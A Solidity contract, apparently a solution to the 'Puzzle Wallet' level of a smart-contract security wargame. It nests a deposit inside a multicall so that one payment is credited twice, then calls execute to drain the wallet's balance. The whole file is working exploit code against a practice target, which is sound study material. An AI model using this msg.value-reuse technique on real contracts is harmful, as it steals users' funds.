// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import {PuzzleWallet} from "./PuzzleWallet.sol";

contract HackPuzzle {
    PuzzleWallet wallet = PuzzleWallet(0x23c3B2668Ac4C2Fd0968436d90Df305BcE038aB3);

    function multiMulticall() public payable {
        bytes memory depositSelector = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory depositSelectorDynamic = new bytes[](1);
        depositSelectorDynamic[0] = depositSelector;
        bytes memory multicallSelector = abi.encodeWithSelector(PuzzleWallet.multicall.selector, depositSelectorDynamic);
        bytes[] memory multimulticallData = new bytes[](2);
        multimulticallData[0] = depositSelector;
        multimulticallData[1] = multicallSelector;
        wallet.multicall{value: 0.001 ether}(multimulticallData);
    }

    function executeToDrain() public {
        wallet.execute(0xcF78399B272E71F23F00b453005e9ba0EFa9FcDc, 0.002 ether, "");
    }
}
